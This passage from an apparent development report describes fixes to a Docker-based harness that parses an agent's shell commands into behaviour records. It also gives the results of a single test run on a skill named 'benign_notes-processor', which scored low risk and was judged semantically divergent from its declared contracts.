     - Extended tool recognition to `"exec_command"`.
     - Parsed structured observation dictionaries and agent message text into `stdout`.
     - Added shell command redirection parsing (`> file`, `>> file`, `tee file`, `cat file`) to extract `file_write` and `file_read` BehaviorUnits directly from shell executions.
     - Implemented fallback evaluation for postcondition checks (e.g. `file_content`) against `written_files` and `stdout` in `build_evidence_from_artifacts`.

4. **Task Inputs & Fixtures Materialization for Instruction-Only Skills (`src/harbor_runner.py`)**:
   - **Root Cause**: For instruction-only skills, `fixtures.json` mock files were never materialized before the agent ran, and `instruction.md` gave no indication of input arguments or target files. The agent thus operated in an empty working directory.
   - **Fix**: Updated `_write_task_fixtures` to materialize `mock_files` into the task's environment directory and append target file inputs and CLI arguments to `instruction.md`. Also configured `_build_harbor_cli_cmd` to explicitly use the virtual environment Python interpreter (`venv/Scripts/python.exe`).

### Verification & Live Single-Skill Test Result
- **Target Skill**: `benign_notes-processor`
- **Execution Command**: `execute_manifest_pipeline` via Harbor Docker with `REAL_ENV=1`, `NET_POLICY=risk_based`, `INSTR_AGENT=codex`, `INSTR_AGENT_MODEL=openai/gpt-4o`.
- **Results**:
  - **Status**: `COMPLETED in 444.85s`
  - **Gating Status**: `INVOKED` (Agent successfully invoked and executed commands)
  - **Level 1 Risk**: `LOW`
  - **Diagnostic Test Coverage (DTC)**: **0.8** (4 of 5 contracts exercised)
  - **Final Level 2 Verdict**: **`Semantically_Divergent`** (substantive adjudication based on actual observed behavior units and output vs declared contracts, with C_03 evaluating to `Aligned`)
  - **Behavior Units Extracted**: Accurately captured all agent shell invocations (`cat notes.md`, `echo > notes.md`), file writes, and stdout narrative.
